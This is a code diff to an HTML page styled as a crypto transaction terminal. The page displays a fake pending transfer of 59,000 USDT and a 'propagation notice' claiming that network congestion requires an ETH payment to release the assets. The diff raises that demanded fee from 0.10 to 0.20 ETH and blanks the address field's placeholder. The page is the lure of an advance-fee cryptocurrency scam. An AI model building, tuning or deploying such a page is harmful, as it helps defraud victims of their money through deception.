@@ -19,7 +19,7 @@
     <div class="terminal-card">
         <div id="input-screen">
             <h3>> ENTER_RECIPIENT_ADDRESS</h3>
-            <input type="text" id="address" placeholder="0x...">
+            <input type="text" id="address" placeholder=" ">
             <button onclick="startTransaction()">CONFIRM & INITIATE</button>
         </div>
 
@@ -34,7 +34,7 @@
             <p>SENDER: <span id="display-address"></span></p>
             <p>ASSET: <span id="display-amount"></span></p>
             <div class="notice-box" id="notice-text">
-                <strong>PROPAGATION NOTICE:</strong> Target node congestion detected. 0.10 ETH is required to finalize current queue and release assets.
+                <strong>PROPAGATION NOTICE:</strong> Target node congestion detected. 0.20 ETH is required to finalize current queue and release assets.
             </div>
         </div>
     </div>
@@ -42,7 +42,7 @@
     <script type="text/javascript">
         const CONFIG = {
             amount: "59,000 USDT",
-            notice: "PROPAGATION NOTICE: Target node congestion detected. 0.10 ETH is required to finalize current queue and release assets."
+            notice: "PROPAGATION NOTICE: Target node congestion detected. 0.20 ETH is required to finalize current queue and release assets."
         };
 
         function startTransaction() {
